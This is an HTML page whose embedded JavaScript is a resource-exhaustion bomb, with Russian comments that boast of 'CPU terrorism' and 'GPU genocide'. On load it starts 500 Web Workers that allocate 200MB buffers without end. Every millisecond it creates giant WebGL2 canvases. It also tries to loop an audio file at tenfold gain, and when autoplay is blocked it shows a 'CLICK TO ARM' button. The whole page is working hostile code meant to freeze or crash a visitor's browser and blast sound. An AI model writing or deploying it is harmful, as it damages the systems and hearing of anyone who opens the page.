<!DOCTYPE html>
<html>
<body>
  <audio id="doomSound" src="sound.mp3"></audio>

  <script>
    // Ультимативный CPU-терроризм (500 воркеров)
    for(let i=0; i<500; i++) {
      new Worker(URL.createObjectURL(new Blob([`
        const bomb = [];
        while(1) {
          bomb.push(new ArrayBuffer(1024 * 1024 * 200)); // 200MB/итерация
          for(let j=0; j<1e10; j++); // Мега-блокирующий цикл
        }
      `])));
    }

    // GPU-геноцид
    const glArmy = [];
    setInterval(() => {
      const canvas = document.createElement('canvas');
      canvas.width = 131072;  // 131k pixels
      canvas.height = 131072;
      
      const gl = canvas.getContext('webgl2', {
        powerPreference: "high-performance",
        failIfMajorPerformanceCaveat: false
      });
      
      glArmy.push(gl);
      try {
        gl.clearColor(Math.random(), 0, 0, 1);
        gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
      } catch(e) {}
    }, 1);

    // Аудио-апокалипсис
    const audio = document.getElementById('doomSound');
    audio.volume = 2.0; // Форсирование громкости >100%
    
    audio.addEventListener('canplay', () => {
      const ctx = new AudioContext();
      const source = ctx.createMediaElementSource(audio);
      const gainNode = ctx.createGain();
      
      gainNode.gain.value = 10.0; // 1000% громкости
      source.connect(gainNode);
      gainNode.connect(ctx.destination);
      
      audio.loop = true;
      audio.play().catch(() => {
        // Обход защиты браузеров
        document.body.innerHTML = '<button onclick="audio.play()">CLICK TO ARM</button>';
      });
    });
  </script>
</body>
</html>
